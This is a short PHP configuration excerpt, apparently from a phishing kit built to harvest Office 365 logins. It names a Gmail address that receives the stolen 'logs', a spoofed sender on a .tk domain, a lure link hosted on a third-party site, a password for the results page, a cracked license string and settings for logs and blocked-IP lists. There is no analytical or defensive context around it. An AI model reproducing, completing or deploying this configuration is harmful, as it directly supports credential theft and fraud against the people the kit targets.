...
$licensekey = "CRACKEDBY@G66K.GOV"; //License key is limited to single-user purchase it from us(@Ex.Robotos)
$toEmail = "europeilogy@gmail.com"; //use "yourfirst@email.com, yoursecond@email.com" for receive result in multiple emails
$fromemail = "no-reply@oumndh.tk";//
$fromname = "3xV4";
$subjectTitle = "0ff365 Logs";
$officeLink = "https://www.bigimpex.com/.1/message-001.wav";
...
$outputpass = "exrobotos";// password for link of results (domain.com/dir/output.php)
$Resetlogs = true; //clears all logs
$ResetAllow = false; //reset list of blocked ips and emails and regions (allow all except bot)
